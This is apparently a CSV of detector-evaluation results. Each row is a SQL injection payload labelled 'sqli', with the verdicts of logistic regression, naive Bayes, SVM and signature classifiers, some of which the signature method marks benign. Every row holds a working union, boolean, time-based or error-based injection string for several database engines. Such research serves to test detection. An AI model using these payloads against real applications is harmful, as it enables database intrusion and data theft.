payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-3938%'))) or 2034=7209#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')) union all select null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 5866=5866 and 4595=4595#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-7868"" union all select 1805--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1));begin user_lock.sleep(5); end and ((6874=6874,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") or elt(5873=5873,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'));(select * from (select(sleep(5)))acdk)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') as ildf where 5545=5545 union all select null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
' or '1' = '1,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-3752%' union all select 9351--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%');if(7899=7899) select 7899 else drop function zbbp--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' where 3188=3188 and 9198=9198--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4954%"") or 5244=4832",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'))) and 3602=1990#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7142')) union all select 5083,5083,5083,5083#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9532)) union all select 6039,6039,6039,6039--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 3476=3476 and elt(1210=1210,sleep(5))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-9100) or 8792=9550--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' in boolean mode);select count(*) from generate_series(1,5000000)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
